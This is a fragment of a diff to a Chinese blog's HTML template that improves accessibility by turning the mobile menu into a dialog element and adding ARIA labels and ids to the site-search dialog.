+    <button class="floating-toc-button" type="button" data-toc-toggle aria-label="打开目录" data-tooltip="目录"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M8 5h13"></path><path d="M13 12h8"></path><path d="M13 19h8"></path><path d="M3 10a2 2 0 0 0 2 2h3"></path><path d="M3 5v12a2 2 0 0 0 2 2h3"></path></svg></button>
     
     <footer class="site-footer">
       <div class="footer-lead">
@@ -234,26 +234,26 @@ params[dataScope]=</code></pre></figure><figure class="code-block"><figcaption><
       </div>
     </footer>
     
-    <div class="mobile-menu" data-mobile-menu aria-hidden="true">
+    <dialog class="mobile-menu" data-mobile-menu aria-label="站点导航">
       <button class="mobile-menu-close" type="button" data-menu-close aria-label="关闭菜单"><svg class="icon" width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
       <nav aria-label="移动导航"><a class="mobile-menu-link" href="/#articles">文章</a><a class="mobile-menu-link" href="/categories/">专题</a><a class="mobile-menu-link" href="/tags/">标签</a><a class="mobile-menu-link" href="/archives/">归档</a><a class="mobile-menu-link" href="/about/">关于</a></nav>
       <div class="mobile-menu-social">
     <a href="https://github.com/xyaxxya" aria-label="GitHub" target="_blank" rel="noopener noreferrer"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="18" r="3"></circle><circle cx="6" cy="6" r="3"></circle><circle cx="18" cy="6" r="3"></circle><path d="M18 9v2c0 .6-.4 1-1 1H7c-.6 0-1-.4-1-1V9"></path><path d="M12 12v3"></path></svg></a>
     <a href="https://blog.csdn.net/xydsg" aria-label="CSDN" target="_blank" rel="noopener noreferrer"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M13.4 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7.4"></path><path d="M2 6h4"></path><path d="M2 10h4"></path><path d="M2 14h4"></path><path d="M2 18h4"></path><path d="M21.378 5.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"></path></svg></a>
     <a href="mailto:3170234809@qq.com" aria-label="Email"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m22 7-8.991 5.727a2 2 0 0 1-2.009 0L2 7"></path><rect x="2" y="4" width="20" height="16" rx="2"></rect></svg></a></div>
-    </div>
+    </dialog>
     
-    <dialog class="search-dialog" data-search-dialog>
+    <dialog class="search-dialog" data-search-dialog aria-labelledby="search-dialog-title" aria-describedby="search-dialog-status">
       <div class="search-shell">
         <header class="search-header">
-          <span class="search-title">站内搜索</span>
+          <span class="search-title" id="search-dialog-title">站内搜索</span>
           <button class="icon-button" type="button" data-close-search aria-label="关闭搜索"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
         </header>
         <label class="search-field">
           <svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="m21 21-4.34-4.34"></path><circle cx="11" cy="11" r="8"></circle></svg>
           <input type="search" data-search-input autocomplete="off" placeholder="搜索标题、标签或正文" aria-label="搜索文章">
         </label>
-        <p class="search-status" data-search-status>输入关键词，查找 39 篇记录。</p>
+        <p class="search-status" id="search-dialog-status" data-search-status>输入关键词，查找 39 篇记录。</p>
         <div class="search-results" data-search-results aria-live="polite"></div>
         <template data-search-result-icon><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></template>
       </div>
